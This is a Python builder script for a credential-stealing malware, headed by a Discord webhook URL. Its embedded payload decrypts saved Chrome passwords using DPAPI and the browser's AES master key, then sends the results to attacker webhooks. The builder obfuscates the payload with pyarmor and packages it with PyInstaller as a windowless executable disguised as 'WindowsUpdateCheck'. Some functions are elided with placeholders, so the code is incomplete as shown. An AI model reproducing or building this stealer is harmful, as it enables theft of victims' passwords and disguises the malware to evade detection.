https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO

pip uninstall pycryptodome -y
pip install pycryptodome



import os
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
import shutil
import tempfile
import textwrap
import requests

# GUI same - no changes needed

# PAYLOAD - Back to Crypto (pycryptodome) for reliable bundling
stealer_code = textwrap.dedent('''
import os
import sys
import time
import subprocess
import socket
import requests
import ctypes
import platform
import uuid
import winreg
import random
from datetime import datetime

try:
    import pyautogui
    HAS_PYAUTO = True
except:
    HAS_PYAUTO = False

import sqlite3
import json
import base64
import shutil
from Crypto.Cipher import AES  # <-- pycryptodome standard import
import win32crypt

# [VM / IP / HWID functions unchanged]

def grab_chrome_passwords():
    data = ""
    try:
        login_db = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(login_db):
            return "No Chrome profile found"
        temp_db = os.path.join(os.getenv("TEMP"), f"LoginTemp_{random.randint(10000,99999)}.db")
        shutil.copyfile(login_db, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_pw = row[2]
            if encrypted_pw:
                try:
                    pw = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
                except:
                    try:
                        local_state = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data", "Local State")
                        with open(local_state, "r", encoding="utf-8") as f:
                            js = json.loads(f.read())
                        master_key = base64.b64decode(js["os_crypt"]["encrypted_key"])[5:]
                        iv = encrypted_pw[3:15]
                        ciphertext = encrypted_pw[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        pw = cipher.decrypt(ciphertext)[:-16].decode('utf-8')
                    except:
                        pw = "DECRYPT FAILED"
                data += f"{url} | {username} | {pw}\\n"
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        data = f"Chrome error: {str(e)}"
    return data if data else "No saved passwords"

# [WiFi / Software / exfil unchanged - full loot]

def exfil(webhooks):
    # same as last

exfil({WEBHOOK_PLACEHOLDER})
''')

# BUILD - Explicit Crypto hidden-imports to force bundling
def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
    if not shutil.which("pyarmor"):
        raise Exception("pyarmor missing")
    if not shutil.which("pyinstaller"):
        raise Exception("pyinstaller missing")

    temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
    script = os.path.join(temp_dir, "recon.py")
    hook_str = repr(webhooks)
    with open(script, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", hook_str))

    obf_dir = os.path.join(temp_dir, "obf")

    gen_cmd = ["pyarmor", "gen", "-O", obf_dir]
    if mode == 1:
        gen_cmd += ["--advanced", "2", "--mix-str"]
    elif mode == 2:
        gen_cmd += ["--enable-rft"]
    gen_cmd += [script]

    result = subprocess.run(gen_cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"Pyarmor failed:\n{result.stderr}")

    obf_script = os.path.join(obf_dir, "recon.py")

    hidden_imports = [
        "pyarmor_runtime", "uuid", "ctypes", "socket", "winreg", "platform",
        "datetime", "random", "subprocess", "os", "sys", "time", "requests",
        "pyautogui", "sqlite3", "json", "base64", "shutil", "win32crypt",
        "Crypto", "Crypto.Cipher", "Crypto.Cipher.AES"  # <-- Critical for pycryptodome bundling
    ]
    hidden_args = [item for mod in hidden_imports for item in ["--hidden-import", mod]]

    pyi_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        "--name", "WindowsUpdateCheck",
    ] + hidden_args + [obf_script]

    result = subprocess.run(pyi_cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"PyInstaller failed:\n{result.stderr}")

    bundled_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
    final = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(bundled_exe, final)

    # Signing same

    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Crypto-bundled full loot stealer built: {final}")

if __name__ == "__main__":
    get_webhook()
